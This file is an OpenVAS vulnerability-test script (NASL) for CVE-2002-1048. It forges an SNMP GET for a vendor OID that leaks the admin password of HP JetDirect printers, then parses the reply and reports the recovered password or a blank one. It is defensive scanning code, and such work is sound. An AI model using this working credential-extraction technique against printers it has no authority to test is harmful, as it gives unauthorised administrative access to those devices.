###############################################################################
# OpenVAS Vulnerability Test
# $Id: snmp_hpJetDirectEWS.nasl 7239 2017-09-22 16:10:31Z cfischer $
#
# Discover HP JetDirect EWS Password via SNMP
#
# Authors:
# Geoff Humes <geoff.humes@digitaldefense.net>
# rip from snmp_sysDesc.nasl, written by
# Renaud Deraison <deraison@cvs.nessus.org>
#
# Copyright:
# Copyright (C) 2003 Digital Defense, Inc.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11317");
  script_version("2019-04-10T13:42:28+0000");
  script_bugtraq_id(5331, 7001);
  script_cve_id("CVE-2002-1048");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2019-04-10 13:42:28 +0000 (Wed, 10 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_name("Discover HP JetDirect EWS Password via SNMP");
  script_category(ACT_GATHER_INFO);
  script_copyright("This script is Copyright (C) 2003 Digital Defense, Inc.");
  script_family("SNMP");
  script_dependencies("snmp_detect.nasl", "gb_hp_printer_detect.nasl");
  script_require_ports(80);
  script_require_udp_ports("Services/udp/snmp", 161);
  script_mandatory_keys("SNMP/detected", "hp_printer/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/313714/2003-03-01/2003-03-07/0");
  script_xref(name:"URL", value:"http://www.iss.net/security_center/static/9693.php");
  script_xref(name:"URL", value:"http://www.iss.net/issEn/delivery/xforce/alertdetail.jsp?id=advise15");

  script_tag(name:"summary", value:"This script attempts to obtain the password of the remote
  HP JetDirect web server (available in some printers)
  by requesting the OID :

  .1.3.6.1.4.1.11.2.3.9.1.1.13.0

  Of the remote printer.

  An attacker may use this flaw to gain administrative access on
  that printer.

  See the references for more information.");
  script_tag(name:"qod_type", value:"remote_banner_unreliable");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("snmp_func.inc");

#--------------------------------------------------------------------#
# Forges an SNMP GET packet                                          #
#--------------------------------------------------------------------#
function get( community, object ) {

  local_var len, tot_len, packet, object_len, pack_len, community, object;

  len = strlen( community );
  len = len % 256;

  tot_len = 23 + strlen( community ) + strlen( object );
  packet = raw_string( 0x30, tot_len, 0x02, 0x01, 0x00, 0x04, len );
  object_len = strlen( object ) + 2;

  pack_len = 16 + strlen( object );
  packet = packet + community +
           raw_string( 0xA0, pack_len, 0x02, 0x04, 0x5e, 0xa4, 0x3f, 0x0c, 0x02, 0x01, 0x00, 0x02,
           0x01, 0x00, 0x30, object_len ) + object + raw_string( 0x05, 0x00 );
  return( packet );
}

#--------------------------------------------------------------------#
# Checks if JetDirect is vulnerable                                  #
#--------------------------------------------------------------------#
function vulnerable( httpport ) {

  local_var httpport, url, reply, sndReq, rcvRes;

  url = "/hp/jetdirect/tcp_param.htm";
  reply = FALSE;

  sndReq = http_get( item:url, port:httpport );
  rcvRes = http_keepalive_send_recv( port:httpport, data:sndReq, bodyonly:FALSE );

  #if firmware is current, url will give a 200 or a 401
  if( rcvRes =~ "HTTP/1\.. 200" || rcvRes =~ "HTTP/1\.. 401" ) return( reply );

  #if 404 returned, old firmware present
  if( rcvRes =~ "HTTP/1\.. 404" ) {

    url = "/";

    rcvRes = http_get_cache( item:url, port:httpport );

    #if / gives 404, web server is disabled - gives 404 for any request
    if( rcvRes !~ "HTTP/1\.. 404" ) {
      reply = TRUE;
    }
  }
  return( reply );
}

passwordless = 0;
password = string("");
equal_sign = raw_string( 0x3D );
nothing = raw_string( 0x00 );

snmpport = get_snmp_port( default:161 );
community = snmp_get_community( port:snmpport );
if( ! community ) exit( 0 );

httpport = 80;
if( ! get_port_state( httpport ) ) exit( 0 );
if( ! ( vulnerable( httpport:httpport ) ) ) exit( 0 );

if( ! get_udp_port_state( snmpport ) ) exit( 0 );
soc = open_sock_udp( snmpport );
if( ! soc ) exit( 0 );

MIB = raw_string( 0x30, 0x11, 0x06,
                  0x0D, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x0B, 0x02,
                  0x03, 0x09, 0x01, 0x01, 0x0D, 0x00 );

req = get( community:community, object:MIB );

send( socket:soc, data:req );
r = recv( socket:soc, length:1025 );

if( ! strlen( r ) ) exit( 0 );

len = strlen( r );

start = 0;
for( i = 0; ( i + 2 ) < len; i++ ) {

  #look for preamble to password
  if( ord( r[i] ) == 0x04 ) {
    if( ord( r[i + 1] ) == 0x82 ) {
      if( ord( r[i + 2] ) == 0x01 ) {
        start = i + 4;
        i = len;
        #found password, check if blank
        if( r[start] == nothing ) {
          if( r[start + 1] == nothing ) {
            if(r[start + 2] == nothing) {
              if( r[start + 3] == nothing ) {
                passwordless = 1;
              }
            }
          }
        }
      }
    }
  }
}

#some printers respond with nothing but 04 00 when passwordless
if( start == 0 && len >= 2 ) {
  if( ( ord( r[len - 1] ) == 0x00 ) && ( ord( r[len - 2] ) == 0x04 ) ) {
    passwordless = 1;
  }
}

if( ! ( passwordless ) ) {
  password = string("The password is ");
  #password format is password=108;  here we look for the = as the end of the passwd
  for( i = start; i < len; i++ ) {
    if( r[i] == equal_sign ) {
      i = len;
    } else {
      password = password + r[i];
    }
  }
}

report = "";

if( strlen( password ) > 1 ) {
  report = "It was possible to obtain the remote printer embedded web server ";
  report += " password ('" + password + "') by querying the SNMP OID .1.3.6.1.4.1.11.2.3.9.1.1.13.0.";
  report += '\n\nAn attacker may use this flaw to gain administrative privileges on this printer';
} else {
  if( passwordless ) {
    report = "It was possible to obtain the remote printer embedded web server ";
    report += "password by querying the SNMP OID .1.3.6.1.4.1.11.2.3.9.1.1.13.0 and we ";
    report += "discovered that the remote printer has no password set !";
    report += '\n\nAn attacker may use this flaw to gain administrative privileges on this printer';
  }
}

if( report != "" ) {
  security_message( port:snmpport, data:report, protocol:"udp" );
  exit( 0 );
}

exit( 99 );